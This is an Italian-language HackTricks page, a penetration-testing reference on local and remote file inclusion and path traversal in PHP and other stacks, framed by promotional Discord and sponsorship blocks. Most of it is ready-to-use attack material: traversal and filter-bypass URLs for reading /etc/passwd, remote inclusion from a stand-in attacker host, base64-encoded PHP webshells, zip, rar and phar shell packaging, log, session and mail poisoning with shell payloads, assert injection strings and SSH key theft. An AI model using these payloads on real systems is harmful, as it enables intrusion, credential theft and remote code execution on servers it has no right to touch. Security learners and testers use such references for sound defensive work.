# Inclusione di file/Traversamento del percorso

<details>

<summary><strong>Impara l'hacking su AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.

</details>

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Unisciti al server [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) per comunicare con hacker esperti e cacciatori di bug bounty!

**Approfondimenti sull'hacking**\
Coinvolgiti con contenuti che esplorano l'emozione e le sfide dell'hacking

**Notizie sull'hacking in tempo reale**\
Resta aggiornato con il mondo dell'hacking in rapida evoluzione attraverso notizie e approfondimenti in tempo reale

**Ultimi Annunci**\
Rimani informato sui nuovi bug bounty in arrivo e sugli aggiornamenti cruciali delle piattaforme

**Unisciti a noi su** [**Discord**](https://discord.com/invite/N3FrSbmwdy) e inizia a collaborare con i migliori hacker oggi!

## Inclusione di file

**Inclusione di file remoto (RFI):** Il file viene caricato da un server remoto (Migliore: Puoi scrivere il codice e il server lo eseguir√†). In php questo √® **disabilitato** per impostazione predefinita (**allow\_url\_include**).\
**Inclusione di file locale (LFI):** Il server carica un file locale.

La vulnerabilit√† si verifica quando l'utente pu√≤ in qualche modo controllare il file che verr√† caricato dal server.

**Funzioni PHP vulnerabili**: require, require\_once, include, include\_once

Uno strumento interessante per sfruttare questa vulnerabilit√†: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interessante - File LFI2RCE
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Mescolando diverse liste LFI di \*nix e aggiungendo pi√π percorsi ho creato questa:**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

Prova anche a cambiare `/` con `\`\
Prova anche ad aggiungere `../../../../../`

Una lista che utilizza diverse tecniche per trovare il file /etc/password (per verificare se esiste la vulnerabilit√†) si trova [qui](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Unione di diverse liste di parole:

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

Prova anche a cambiare `/` con `\`\
Prova anche a rimuovere `C:/` e aggiungere `../../../../../`

Una lista che utilizza diverse tecniche per trovare il file /boot.ini (per verificare se esiste la vulnerabilit√†) si trova [qui](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Controlla la lista LFI di Linux.

## LFI di base e bypass

Tutti gli esempi sono per Local File Inclusion ma potrebbero essere applicati anche a Remote File Inclusion (pagina=[http://myserver.com/phpshellcode.txt\\](http://myserver.com/phpshellcode.txt\)/).
```
http://example.com/index.php?page=../../../etc/passwd
```
### sequenze di attraversamento rimosse in modo non ricorsivo
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Byte nullo (%00)**

Bypassa l'aggiunta di ulteriori caratteri alla fine della stringa fornita (bypass di: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Questo √® **risolto da PHP 5.4 in poi**

### **Codifica**

Potresti utilizzare codifiche non standard come la doppia codifica URL (e altre):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Dalla cartella esistente

Forse il back-end sta controllando il percorso della cartella:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Esplorazione delle Directory del File System su un Server

Il file system di un server pu√≤ essere esplorato in modo ricorsivo per identificare directory, non solo file, utilizzando determinate tecniche. Questo processo implica il determinare la profondit√† della directory e sondare l'esistenza di cartelle specifiche. Di seguito √® riportato un metodo dettagliato per raggiungere questo obiettivo:

1. **Determinare la Profondit√† della Directory:** Accertare la profondit√† della directory corrente ottenendo con successo il file `/etc/passwd` (applicabile se il server √® basato su Linux). Un esempio di URL potrebbe essere strutturato come segue, indicando una profondit√† di tre:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Sonda per Cartelle:** Aggiungi il nome della cartella sospettata (ad esempio, `private`) all'URL, quindi naviga nuovamente a `/etc/passwd`. Il livello aggiuntivo della directory richiede di incrementare la profondit√† di uno:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Interpretare i Risultati:** La risposta del server indica se la cartella esiste:
   * **Errore / Nessun Output:** La cartella `private` probabilmente non esiste nella posizione specificata.
   * **Contenuti di `/etc/passwd`:** La presenza della cartella `private` √® confermata.
4. **Esplorazione Ricorsiva:** Le cartelle scoperte possono essere ulteriormente esaminate per sottocartelle o file utilizzando la stessa tecnica o metodi tradizionali di Inclusione di File Locale (LFI).

Per esplorare directory in posizioni diverse nel sistema di file, regolare il payload di conseguenza. Ad esempio, per verificare se `/var/www/` contiene una directory `private` (ipotizzando che la directory corrente sia a una profondit√† di 3), utilizzare:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Tecnica di Troncamento del Percorso**

Il troncamento del percorso √® un metodo utilizzato per manipolare i percorsi dei file nelle applicazioni web. Spesso viene utilizzato per accedere a file restritti eludendo determinate misure di sicurezza che aggiungono caratteri aggiuntivi alla fine dei percorsi dei file. L'obiettivo √® creare un percorso del file che, una volta modificato dalla misura di sicurezza, continui a puntare al file desiderato.

In PHP, varie rappresentazioni di un percorso del file possono essere considerate equivalenti a causa della natura del sistema di file. Ad esempio:

* `/etc/passwd`, `/etc//passwd`, `/etc/./passwd` e `/etc/passwd/` sono tutti trattati come lo stesso percorso.
* Quando gli ultimi 6 caratteri sono `passwd`, aggiungere un `/` (rendendolo `passwd/`) non cambia il file di destinazione.
* Allo stesso modo, se viene aggiunto `.php` a un percorso del file (come `shellcode.php`), aggiungere `/.` alla fine non alterer√† il file che viene accesso.

Gli esempi forniti dimostrano come utilizzare il troncamento del percorso per accedere a `/etc/passwd`, un obiettivo comune a causa dei suoi contenuti sensibili (informazioni sull'account utente):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
In questi scenari, il numero di attraversamenti necessari potrebbe essere circa 2027, ma questo numero pu√≤ variare in base alla configurazione del server.

* **Utilizzo di segmenti puntati e caratteri aggiuntivi**: Le sequenze di attraversamento (`../`) combinate con segmenti puntati e caratteri aggiuntivi possono essere utilizzate per navigare nel file system, ignorando efficacemente le stringhe aggiunte dal server.
* **Determinazione del numero necessario di attraversamenti**: Attraverso tentativi ed errori, √® possibile trovare il numero preciso di sequenze `../` necessarie per navigare alla directory radice e quindi a `/etc/passwd`, garantendo che le stringhe aggiunte (come `.php`) siano neutralizzate ma il percorso desiderato (`/etc/passwd`) rimanga intatto.
* **Iniziare con una directory fittizia**: √à pratica comune iniziare il percorso con una directory inesistente (come `a/`). Questa tecnica viene utilizzata come misura precauzionale o per soddisfare i requisiti della logica di analisi del percorso del server.

Nell'utilizzo delle tecniche di troncamento del percorso, √® cruciale comprendere il comportamento di analisi del percorso del server e la struttura del file system. Ogni scenario potrebbe richiedere un approccio diverso e spesso √® necessario effettuare test per trovare il metodo pi√π efficace.

**Questa vulnerabilit√† √® stata corretta in PHP 5.3.**

### **Trucchi di bypass del filtro**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Inclusione Remota di File

In php questo √® disabilitato di default perch√© **`allow_url_include`** √® **Off.** Deve essere **On** affinch√© funzioni e, in tal caso, potresti includere un file PHP dal tuo server e ottenere RCE:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Se per qualche motivo **`allow_url_include`** √® **On**, ma PHP sta **filtrando** l'accesso alle pagine web esterne, [secondo questo post](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), potresti utilizzare ad esempio il protocollo data con base64 per decodificare un codice PHP b64 ed ottenere RCE:

{% code overflow="wrap" %}
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
{% endcode %}

{% hint style="info" %}
Nel codice precedente, il `+.txt` finale √® stato aggiunto perch√© l'attaccante aveva bisogno di una stringa che terminasse in `.txt`, quindi la stringa finisce con esso e dopo la decodifica b64 quella parte restituir√† solo dati non validi e il vero codice PHP verr√† incluso (e quindi, eseguito).
{% endhint %}

Un altro esempio **senza utilizzare il protocollo `php://`** sarebbe:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
{% endcode %}

## Elemento radice di Python

In python in un codice come questo:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Se l'utente passa un **percorso assoluto** a **`file_name`**, il **percorso precedente viene semplicemente rimosso**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
√à il comportamento previsto secondo [i documenti](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Se un componente √® un percorso assoluto, tutti i componenti precedenti vengono eliminati e la concatenazione continua dal componente del percorso assoluto.

## Elenco directory Java

Sembra che se si ha una Traversata di Percorso in Java e si **chiede una directory** invece di un file, viene restituito un **elenco della directory**. Questo non accadr√† in altre lingue (per quanto ne so).

## Top 25 parametri

Ecco l'elenco dei primi 25 parametri che potrebbero essere vulnerabili alle vulnerabilit√† di inclusione di file locale (LFI) (da [questo link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI usando wrapper e protocolli PHP

### php://filter

I filtri PHP consentono di eseguire **operazioni di modifica di base sui dati** prima che vengano letti o scritti. Ci sono 5 categorie di filtri:

* [Filtri di stringhe](https://www.php.net/manual/en/filters.string.php):
* `string.rot13`
* `string.toupper`
* `string.tolower`
* `string.strip_tags`: Rimuove i tag dai dati (tutto ci√≤ che si trova tra i caratteri "<" e ">")
* Nota che questo filtro √® scomparso dalle versioni moderne di PHP
* [Filtri di conversione](https://www.php.net/manual/en/filters.convert.php)
* `convert.base64-encode`
* `convert.base64-decode`
* `convert.quoted-printable-encode`
* `convert.quoted-printable-decode`
* `convert.iconv.*`: Trasforma in una codifica diversa (`convert.iconv.<input_enc>.<output_enc>`). Per ottenere l'**elenco di tutte le codifiche** supportate, eseguire nella console: `iconv -l`

{% hint style="warning" %}
Abusando del filtro di conversione `convert.iconv.*` √® possibile **generare testo arbitrario**, che potrebbe essere utile per scrivere testo arbitrario o rendere un processo di inclusione di funzioni arbitrario. Per ulteriori informazioni, controllare [**LFI2RCE tramite filtri php**](lfi2rce-via-php-filters.md).
{% endhint %}

* [Filtri di compressione](https://www.php.net/manual/en/filters.compression.php)
* `zlib.deflate`: Comprimi il contenuto (utile se si sta esfiltrando molte informazioni)
* `zlib.inflate`: Decomprimi i dati
* [Filtri di crittografia](https://www.php.net/manual/en/filters.encryption.php)
* `mcrypt.*`: Deprecato
* `mdecrypt.*`: Deprecato
* Altri filtri
* Eseguendo in php `var_dump(stream_get_filters());` √® possibile trovare un paio di **filtri inaspettati**:
* `consumed`
* `dechunk`: inverte la codifica chunked HTTP
* `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,¬£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
{% hint style="warning" %}
La parte "php://filter" non fa distinzione tra maiuscole e minuscole
{% endhint %}

### Utilizzo dei filtri php come oracolo per leggere file arbitrari

[**In questo post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) viene proposta una tecnica per leggere un file locale senza ottenere l'output restituito dal server. Questa tecnica si basa su un **esfiltrazione booleana del file (carattere per carattere) utilizzando i filtri php** come oracolo. Questo perch√© i filtri php possono essere utilizzati per rendere un testo sufficientemente grande da far generare un'eccezione a php.

Nel post originale puoi trovare una spiegazione dettagliata della tecnica, ma ecco un breve riassunto:

* Utilizzare il codec **`UCS-4LE`** per lasciare il carattere iniziale del testo all'inizio e far aumentare esponenzialmente la dimensione della stringa.
* Questo verr√† utilizzato per generare un **testo cos√¨ grande quando la lettera iniziale viene indovinata correttamente** che php generer√† un **errore**
* Il filtro **dechunk** **rimuover√† tutto se il primo carattere non √® esadecimale**, quindi possiamo sapere se il primo carattere √® esadecimale.
* Questo, combinato con il precedente (e altri filtri a seconda della lettera indovinata), ci permetter√† di indovinare una lettera all'inizio del testo vedendo quando facciamo abbastanza trasformazioni per far s√¨ che non sia pi√π un carattere esadecimale. Perch√© se √® esadecimale, dechunk non lo eliminer√† e la bomba iniziale far√† generare un errore a php.
* Il codec **convert.iconv.UNICODE.CP930** trasforma ogni lettera nella successiva (quindi dopo questo codec: a -> b). Questo ci permette di scoprire se la prima lettera √® una `a`, ad esempio, perch√© se applichiamo 6 di questo codec a->b->c->d->e->f->g la lettera non √® pi√π un carattere esadecimale, quindi dechunk non lo elimina e viene generato l'errore di php perch√© si moltiplica con la bomba iniziale.
* Utilizzando altre trasformazioni come **rot13** all'inizio √® possibile esfiltrare altre lettere come n, o, p, q, r (e altri codec possono essere utilizzati per spostare altre lettere nell'intervallo esadecimale).
* Quando il carattere iniziale √® un numero √® necessario codificarlo in base64 e rilasciare le prime 2 lettere per rilasciare il numero.
* Il problema finale √® vedere **come rilasciare pi√π della lettera iniziale**. Utilizzando filtri di memoria di ordine come **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** √® possibile cambiare l'ordine dei caratteri e ottenere nelle prime posizioni altre lettere del testo.
* E per poter ottenere **ulteriori dati** l'idea √® quella di **generare 2 byte di dati spazzatura all'inizio** con **convert.iconv.UTF16.UTF16**, applicare **UCS-4LE** per farlo **ruotare con i successivi 2 byte**, e **eliminare i dati fino ai dati spazzatura** (questo rimuover√† i primi 2 byte del testo iniziale). Continuare a fare ci√≤ fino a raggiungere il bit desiderato da rilasciare.

Nel post √® stato anche rilasciato uno strumento per eseguire questo processo automaticamente: [php\_filters\_chain\_oracle\_exploit](https://github.com/synacktiv/php\_filter\_chains\_oracle\_exploit).

### php://fd

Questo wrapper consente di accedere ai descrittori di file che il processo ha aperto. Potenzialmente utile per esfiltrare il contenuto dei file aperti:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Puoi anche utilizzare **php://stdin, php://stdout e php://stderr** per accedere rispettivamente ai **descrittori di file 0, 1 e 2** (non si sa esattamente come potrebbe essere utile in un attacco)

### zip:// e rar://

Carica un file Zip o Rar con un PHPShell all'interno e accedilo.\
Per poter abusare del protocollo rar, **deve essere attivato specificamente**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://

Il protocollo `data://` consente di specificare i dati direttamente nell'URL anzich√© fare riferimento a una risorsa esterna. Questo pu√≤ essere sfruttato per l'inclusione di file, consentendo a un attaccante di inserire dati arbitrari all'interno di un'applicazione web.
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Nota che questo protocollo √® limitato dalle configurazioni php **`allow_url_open`** e **`allow_url_include`**

### expect://

Expect deve essere attivato. Puoi eseguire codice usando questo:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Specifica il tuo payload nei parametri POST:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Un file `.phar` pu√≤ essere utilizzato per eseguire codice PHP quando un'applicazione web sfrutta funzioni come `include` per il caricamento di file. Lo snippet di codice PHP fornito di seguito dimostra la creazione di un file `.phar`:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Per compilare il file `.phar`, eseguire il seguente comando:
```bash
php --define phar.readonly=0 create_path.php
```
All'esecuzione, verr√† creato un file chiamato `test.phar`, che potrebbe essere sfruttato per sfruttare le vulnerabilit√† di Inclusione Locale di File (LFI).

Nei casi in cui l'LFI esegue solo la lettura dei file senza eseguire il codice PHP al suo interno, attraverso funzioni come `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, o `filesize()`, potrebbe essere tentata l'exploit di una vulnerabilit√† di deserializzazione. Questa vulnerabilit√† √® associata alla lettura dei file utilizzando il protocollo `phar`.

Per una comprensione dettagliata dello sfruttamento delle vulnerabilit√† di deserializzazione nel contesto dei file `.phar`, fare riferimento al documento collegato di seguito:

[Guida allo Sfruttamento della Deserializzazione di Phar](phar-deserialization.md)

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### CVE-2024-2961

Era possibile abusare **di qualsiasi file arbitrario letto da PHP che supporta i filtri php** per ottenere un RCE. La descrizione dettagliata pu√≤ essere **trovata in questo post**.\
Breve riassunto: un **overflow di 3 byte** nell'heap di PHP √® stato abusato per **alterare la catena di chunk liberi** di una dimensione specifica al fine di poter **scrivere qualsiasi cosa in qualsiasi indirizzo**, quindi √® stato aggiunto un hook per chiamare **`system`**.\
Era possibile allocare chunk di dimensioni specifiche abusando di pi√π filtri php.

### Altri protocolli

Controlla pi√π possibili [**protocolli da includere qui**](https://www.php.net/manual/en/wrappers.php)**:**

* [php://memory e php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) ‚Äî Scrivere in memoria o in un file temporaneo (non sicuro come possa essere utile in un attacco di inclusione di file)
* [file://](https://www.php.net/manual/en/wrappers.file.php) ‚Äî Accesso al filesystem locale
* [http://](https://www.php.net/manual/en/wrappers.http.php) ‚Äî Accesso agli URL HTTP(s)
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) ‚Äî Accesso agli URL FTP(s)
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) ‚Äî Flussi di compressione
* [glob://](https://www.php.net/manual/en/wrappers.glob.php) ‚Äî Trova i percorsi corrispondenti al modello (non restituisce nulla di stampabile, quindi non √® davvero utile qui)
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) ‚Äî Secure Shell 2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) ‚Äî Flussi audio (Non utile per leggere file arbitrari)

## LFI tramite 'assert' di PHP

I rischi di Inclusione Locale di File (LFI) in PHP sono particolarmente alti quando si tratta della funzione 'assert', che pu√≤ eseguire codice all'interno di stringhe. Questo √® particolarmente problematico se l'input contenente caratteri di attraversamento directory come ".." viene controllato ma non correttamente sanificato.

Ad esempio, il codice PHP potrebbe essere progettato per prevenire l'attraversamento delle directory in questo modo:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Mentre questo mira a fermare il travaso, crea involontariamente un vettore per l'iniezione di codice. Per sfruttare ci√≤ per leggere i contenuti del file, un attaccante potrebbe utilizzare:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Allo stesso modo, per eseguire comandi di sistema arbitrari, si potrebbe utilizzare:
```plaintext
' and die(system("id")) or '
```
√à importante **codificare gli URL di questi payload**.

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Unisciti al server [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) per comunicare con hacker esperti e cacciatori di bug!

**Approfondimenti sull'Hacking**\
Interagisci con contenuti che esplorano l'emozione e le sfide dell'hacking

**Notizie sull'Hacking in Tempo Reale**\
Resta aggiornato sul mondo dell'hacking in rapida evoluzione attraverso notizie e approfondimenti in tempo reale

**Ultime Annunci**\
Resta informato sui nuovi bug bounty in arrivo e sugli aggiornamenti cruciali della piattaforma

**Unisciti a noi su** [**Discord**](https://discord.com/invite/N3FrSbmwdy) e inizia a collaborare con i migliori hacker oggi stesso!

## Traversal del Percorso Cieco PHP

{% hint style="warning" %}
Questa tecnica √® rilevante nei casi in cui **controlli** il **percorso del file** di una **funzione PHP** che **acceder√† a un file** ma non vedrai il contenuto del file (come una semplice chiamata a **`file()`**) ma il contenuto non viene mostrato.
{% endhint %}

In [**questo incredibile post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) viene spiegato come un traversal del percorso cieco possa essere abusato tramite il filtro PHP per **esfiltrare il contenuto di un file tramite un oracolo di errore**.

In sintesi, la tecnica utilizza la codifica **"UCS-4LE"** per rendere il contenuto di un file cos√¨ **grande** che la **funzione PHP che apre** il file attiver√† un **errore**.

Successivamente, per rivelare il primo carattere, viene utilizzato il filtro **`dechunk`** insieme ad altri come **base64** o **rot13** e infine vengono utilizzati i filtri **convert.iconv.UCS-4.UCS-4LE** e **convert.iconv.UTF16.UTF-16BE** per **posizionare altri caratteri all'inizio e rivelarli**.

**Funzioni che potrebbero essere vulnerabili**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (solo obiettivo di sola lettura con questo)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Per i dettagli tecnici consulta il post menzionato!

## LFI2RCE

### Inclusione Remota di File

Gi√† spiegato in precedenza, [**seguire questo link**](./#remote-file-inclusion).

### Attraverso il file di log di Apache/Nginx

Se il server Apache o Nginx √® **vulnerabile all'LFI** all'interno della funzione di inclusione, potresti provare ad accedere a **`/var/log/apache2/access.log` o `/var/log/nginx/access.log`**, impostare all'interno dell'**user agent** o all'interno di un **parametro GET** una shell PHP come **`<?php system($_GET['c']); ?>`** e includere quel file

{% hint style="warning" %}
Nota che **se usi virgolette doppie** per la shell invece di **virgolette singole**, le virgolette doppie verranno modificate nella stringa "_**quote;**_", **PHP generer√† un errore** e **null'altro verr√† eseguito**.

Inoltre, assicurati di **scrivere correttamente il payload** o PHP generer√† un errore ogni volta che cercher√† di caricare il file di log e non avrai una seconda opportunit√†.
{% endhint %}

Questo potrebbe essere fatto anche in altri log ma **fai attenzione**, il codice all'interno dei log potrebbe essere codificato in URL e questo potrebbe distruggere la Shell. L'intestazione **authorisation "basic"** contiene "user:password" in Base64 e viene decodificata all'interno dei log. La PHPShell potrebbe essere inserita all'interno di questa intestazione.\
Altri possibili percorsi dei log:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Tramite Email

**Invia una mail** a un account interno (user@localhost) contenente il tuo payload PHP come `<?php echo system($_REQUEST["cmd"]); ?>` e prova ad includerlo nella mail dell'utente con un percorso come **`/var/mail/<USERNAME>`** o **`/var/spool/mail/<USERNAME>`**

### Tramite /proc/\*/fd/\*

1. Carica molti shell (ad esempio: 100)
2. Includi [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), con $PID = PID del processo (pu√≤ essere forzato) e $FD il descrittore del file (pu√≤ essere forzato anche)

### Tramite /proc/self/environ

Come un file di log, invia il payload nell'User-Agent, verr√† riflesso all'interno del file /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Tramite caricamento

Se puoi caricare un file, inserisci semplicemente il payload della shell al suo interno (ad esempio: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
### Tramite caricamento di file Zip

Carica un file ZIP contenente una shell PHP compressa e accedi:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Attraverso le sessioni PHP

Verifica se il sito web utilizza le sessioni PHP (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
In PHP queste sessioni sono memorizzate nei file _/var/lib/php5/sess\\_\[PHPSESSID]\_
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Imposta il cookie su `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Usa il LFI per includere il file della sessione PHP
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Tramite ssh

Se ssh √® attivo, controlla quale utente viene utilizzato (/proc/self/status & /etc/passwd) e prova ad accedere a **\<HOME>/.ssh/id\_rsa**

### **Tramite** **registri** **vsftpd**

I registri del server FTP vsftpd si trovano in _**/var/log/vsftpd.log**_. Nel caso in cui esista una vulnerabilit√† di Inclusione di File Locale (LFI) e l'accesso a un server vsftpd esposto sia possibile, si possono considerare i seguenti passaggi:

1. Iniettare un payload PHP nel campo dell'username durante il processo di accesso.
2. Dopo l'iniezione, utilizzare il LFI per recuperare i registri del server da _**/var/log/vsftpd.log**_.

### Tramite filtro php base64 (usando base64)

Come mostrato in [questo](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) articolo, il filtro base64 di PHP ignora semplicemente i Non-base64. Puoi utilizzarlo per aggirare il controllo dell'estensione del file: se fornisci base64 che termina con ".php", esso ignorer√† il "." e aggiunger√† "php" al base64. Ecco un esempio di payload:
```url
